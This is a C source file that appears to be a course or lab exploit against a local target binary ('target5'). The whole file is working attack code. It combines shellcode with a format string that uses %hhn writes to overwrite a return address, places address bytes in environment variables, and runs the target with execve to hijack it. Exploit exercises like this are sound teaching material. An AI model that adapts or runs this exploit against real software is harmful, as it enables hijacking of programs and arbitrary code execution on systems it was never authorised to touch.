#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define hacking_memory "\x68\xfe\x21\x20\x00" // memory of return address
#define shell_size 45 // not 46
#define buffer_len 256//
#define format_string "%32x%37$hhn %36$hhn%63x%34$hhn%153x%35$hhn"

int main(void)
{
  char *args[3];
  char *env[16];
  
  char hack_buffer[buffer_len];

	int i; // inputting shellcode in first 46 bytes
	for (i=0; i< shell_size; i++){
		hack_buffer[i] = shellcode[i];
	}

	for (i=45; i< buffer_len; i++){ // inputting junk for the rest of the buffer that is not null
		hack_buffer[i] = 0x03; 
	}
  
  
  memcpy(&hack_buffer[224], hacking_memory, 5);
  
   
  int format_string_length = strlen(format_string);
  memcpy(&hack_buffer[60], format_string, format_string_length);


  hack_buffer[buffer_len - 1] = '\x00'; //null character


  args[0] = TARGET; args[1] = hack_buffer; args[2] = NULL;
   
   env[0]=  "\x00";
   env[1]=  "\x00";
   env[2]=  "\x00";
   env[3]=  "\x69\xfe\x21\x20";
   env[4]=  "\x00";
   env[5]=  "\x00";
   env[6]=  "\x00";
   env[7]=  "\x6a\xfe\x21\x20";
   env[8]=  "\x00";
   env[9]=  "\x00";
   env[10]=  "\x00";
   env[11]=  "\x6b\xfe\x21\x20";
   env[12]=  "\x00";
   env[13]=  "\x00";
   env[14]=  "\x00";
   env[15]=  "\x00";
   
  

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
